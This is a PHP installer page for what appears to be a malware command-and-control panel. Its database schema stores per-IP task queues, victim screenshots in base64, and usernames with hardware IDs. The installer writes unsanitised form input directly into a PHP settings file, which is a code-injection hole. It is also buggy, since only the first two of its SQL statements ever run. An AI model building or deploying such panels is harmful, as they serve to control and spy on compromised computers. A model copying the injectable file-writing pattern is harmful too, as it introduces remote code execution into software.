<?php
	if(isset($_POST["install"])) {

		// Create connection
		$conn = new mysqli($_POST["host"],$_POST["user"],$_POST["pass"]);

		// Check connection
		if ($conn->connect_error) {
			die("Connection failed: " . $conn->connect_error);
		} 

		$sqls0 = array("CREATE DATABASE controler", "CREATE TABLE `controler`.`task_all` ( `value` VARCHAR(10) NOT NULL DEFAULT 'task_is' , `task` TEXT NOT NULL ) ENGINE = InnoDB;", "INSERT INTO `task_all`(`task`) VALUES ('1111')", "CREATE TABLE `controler`.`task_to` ( `ip` VARCHAR(20) NOT NULL , `task` TEXT NOT NULL ) ENGINE = InnoDB;", "CREATE TABLE `controler`.`screenshot` ( `ip` VARCHAR(20) NOT NULL , `base64` TEXT NOT NULL ) ENGINE = InnoDB;", "CREATE TABLE `controler`.`user` ( `ip` TEXT NOT NULL , `user` VARCHAR(20) NOT NULL , `hwid` VARCHAR(18) NOT NULL ) ENGINE = InnoDB;");
		
		for ($i = 0; $i != 2; $i++)
			$conn->query($sqls0[$i]);
		
		$conn->close();

		$settings = fopen("include/settings.php", "w") or die("Unable to open file!");
		$set = "<?php\n".'	$host = "'.$_POST["host"].'"'.";\n".'	$user = "'.$_POST["user"].'"'.";\n".'	$pass = "'.$_POST["pass"].'"'.";\n".'	$admin = "'.$_POST["adm"].'"'.";\n"."?>";
		fwrite($settings, $set);
		fclose($settings);
	}
?>

<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<style>
			input[type=text], select {
				width: 100%;
				padding: 12px 20px;
				margin: 8px 0;
				display: inline-block;
				border: 1px solid #ccc;
				border-radius: 4px;
				box-sizing: border-box;
			}

			input[type=submit] {
				width: 100%;
				background-color: #4CAF50;
				color: white;
				padding: 14px 20px;
				margin: 8px 0;
				border: none;
				border-radius: 4px;
				cursor: pointer;
			}

			input[type=submit]:hover {
				background-color: #45a049;
			}

			div {
				border-radius: 5px;
				background-color: #f2f2f2;
				padding: 20px;
			}
		</style>
		<title>Install Page</title>
	</head>
	<body>

		<h3>Install</h3>

		<div>
		  <form method="post">
			<label for="lhost">Host</label>
			<input type="text" id="lhost" name="host" placeholder="Example: localhost" required>
			
			<label for="luser">User</label>
			<input type="text" id="luser" name="user" placeholder="Example: magazine" required>
			
			<label for="lpass">User password</label>
			<input type="text" id="lpass" name="pass" placeholder="8-64 length" required>
			
			<hr>
			
			<label for="ladm">Admin Password</label>
			<input type="text" id="lamd" name="adm" placeholder="8-64 lenght" required>
			
			<input type="hidden" name="install" value="1">
			
			<input type="submit" value="Submit">
		  </form>
		</div>

	</body>
</html>
